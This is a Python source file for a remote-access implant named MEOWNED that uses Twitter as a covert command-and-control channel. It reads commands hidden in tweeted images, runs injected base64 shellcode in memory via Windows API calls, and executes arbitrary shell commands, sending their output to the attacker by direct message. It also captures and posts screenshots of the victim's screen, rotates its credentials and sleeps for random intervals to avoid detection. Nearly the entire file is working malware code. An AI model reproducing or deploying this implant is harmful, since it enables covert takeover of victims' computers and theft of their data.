#!/usr/bin/python
# """MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
"""pip3 install python-twitter"""
"""pip3 install pyyaml"""

import sys
import os
import yaml
import twitter
import urllib
import re
import ctypes
import base64
import time
import random
import requests
import subprocess
from subprocess import check_output

# Try to import windows specific modules
try:
    import win32gui
    import win32ui
    import win32con
    import win32api
    from PIL import Image
except ImportError:
    pass

# Import YAML
with open("conf.yaml", 'r') as stream:
    try:
        conf = yaml.load(stream)
    except yaml.YAMLError as exc:
        sys.exit("Error: Couldn't parse configuration file, check if conf.yaml exists.")

# Twitter API handler
api = twitter.Api(consumer_key=conf['twitter']['consumer_key'], 
    consumer_secret=conf['twitter']['consumer_secret'], 
    access_token_key=conf['twitter']['access_token_key'], 
    access_token_secret=conf['twitter']['access_token_secret'])

def tweet_image(src_image, message):
    # Hide the secret message
    # secret = lsb.hide("./source-imgs/" + src_image, message)
    # secret.save("./output-imgs/" + src_image)

    # Post image to Twitter
    status = api.PostMedia( "meow " + "#" + conf['id'], "./output-imgs/" + src_image)
    print("Tweeting image: ")
    print(status.text)

def tweet_message(message):
    # Post message to Twitter
    status = api.PostUpdate( message + " #" + victim_hash)
    print("Tweeting message: ")
    print(status.text)

def verify_api():
    # Verify API credentials with twitter
    try:
        api.VerifyCredentials()
        print("Twitter credentials are valid.")
        return True
    except twitter.error.TwitterError as exc:
        print("Error: Couldn't authenticate with Twitter.")
        return False

def get_secret(image):
    # reveal hidden message in the image
    clear_message = check_output(["py", "reveal.py", "./download/" + image])
    print(clear_message)
    return clear_message

def search_hashtag(cc_hastag):
    return api.GetSearch(term = cc_hastag)

def run_shellcode(shellcode_str):
    # decode the shellcode from base64 
    print("Running shellcode...")
    shellcode = bytearray(base64.b64decode(shellcode_str))
    
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode)),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))
    
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))
    
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.c_int(ptr),
                                            ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.pointer(ctypes.c_int(0)))
    
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

def run_bash_command(bash_command_str, to):
    print("Executing bash command: " + bash_command_str)
    proc = subprocess.Popen(bash_command_str, shell=True, stdout=subprocess.PIPE)
    output = proc.stdout.read()
    if(to is not None and to > 0):
        print("Sending output: \n" + output + "\nto: " + to)
        api.PostDirectMessage(text=output, user_id=to)

def run_take_screenshot(to):
    print("Taking screenshot...")
    # Taken from Black Hat Python book
    hdesktop = win32gui.GetDesktopWindow()

    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    screenshot.SaveBitmapFile(mem_dc, "./output-imgs/screenshot.bmp")
    img = Image.open("./output-imgs/screenshot.bmp")
    img.save( "./output-imgs/screenshot.png", "png")

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

    os.remove("./output-imgs/screenshot.bmp");
    tweet_image("screenshot.png", "Smile!")

def check_new_creds(yaml_conf):
    global api, conf
    conf = yaml.load(yaml_conf)
    
    stream = file('conf.yaml', 'w')
    yaml.dump(conf, stream, default_flow_style = False)

    # reload api with new creds
    print("API Credentials changed.")
    api = twitter.Api(consumer_key=conf['twitter']['consumer_key'], 
    consumer_secret=conf['twitter']['consumer_secret'], 
    access_token_key=conf['twitter']['access_token_key'], 
    access_token_secret=conf['twitter']['access_token_secret'])

def meow_operation(operation_mode, operation_payload, sender):
    if (operation_mode == "SHELL_CODE"):
        run_shellcode(operation_payload)
    elif (operation_mode == "BASH_COMMAND"):
        run_bash_command(operation_payload, sender)
    elif (operation_mode == "TAKE_SCREENSHOT"):
        run_take_screenshot(sender)
    elif (operation_mode == "NEW_CREDS"):
        check_new_creds(operation_payload)

def get_cmds():
    print("Searching for hashtag: " + conf['id'])
    # Get the last command from C&C Center
    tweets = search_hashtag("#" + conf['id'])

    print("Retrieving new commands...")
    #print("Tweets: \n")
    #for tweet in tweets:
    #    print("     " + str(tweet) + "\n")
    if(len(tweets) > 0):
        return tweets
    else:
        print("Nothing new.")
        return []

def get_last_cmd():
    print("Searching for hashtag: " + conf['id'])
    # Get the last command from C&C Center
    tweets = search_hashtag("#" + conf['id'])

    print("Retrieving new commands...")
    #print("Tweets: \n")
    #for tweet in tweets:
    #    print("     " + str(tweet) + "\n")
    if(len(tweets) > 0):
        return tweets[0]
    else:
        print("Nothing new.")

def process_tweet(tweet):
    # Process tweet
    if(len(tweet.media) > 0):
        print("Downloading tweet image...")
        urllib.urlretrieve(tweet.media[0].media_url_https, "./download/cmd.png")
        print("Downloaded.")
        print("Decrypting hidden message...")
        # try:
        payload = get_secret("cmd.png")
        payload_splitted = payload.split(":",1)
        if(len(payload_splitted) == 2):
            operation_mode = payload_splitted[0]
            operation_payload = payload_splitted[1]
            meow_operation(operation_mode, operation_payload, str(tweet.user.id))
        else:
            print("[ERROR] No protocol specified")
        # except:
        #     print("[ERROR] Decrypting hidden message.")
        #     pass

def extract_urls():
    return re.search("(?P<url>https?://[^\s]+)", myString).group("url")

def get_new_creds():
    # Find an image that includes the new credentials
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Referer': 'https://twitter.com/',
        'Accept-Encoding': 'gzip,deflate',
        'Host': 'twitter.com',
        'Connection': 'Keep-Alive'
    }

    url = "https://twitter.com/search?f=tweets&q=%23NEW_CREDENTIALS%20%23" + conf["id"]

    print("Searching for new credentials...")
    response = requests.get(url, headers=headers)
    content = response.text.encode('utf-8').strip()

    pattern = re.compile(r'(https:\/\/pbs\.twimg\.com\/media\/.*\.png)')

    for (image_url) in re.findall(pattern, content):
        # FIX ME
        tweet = twitter.models.Status()
        tweet.user = twitter.models.User()
        tweet.user.id = 0
        tweet.media = [twitter.models.Media()]
        tweet.media[0].media_url_https = image_url
        process_tweet(tweet)

def main(argv):
    # Main 
    last_api_cred_check = 0

    # Main Loop
    while True:
        # Verify API Credentials
        if((time.time() - last_api_cred_check) > conf["api_cred_ttl"]):
            if(verify_api()):
                last_api_cred_check = time.time()
            else:
                get_new_creds()
        else:
            # Get last C&C tweet
            cmd_tweet = get_last_cmd()

            if(cmd_tweet):
                process_tweet(cmd_tweet)

        time.sleep(random.randint(conf["min_idle_secs"], conf["max_idle_secs"]))

if __name__ == "__main__":
    main(sys.argv)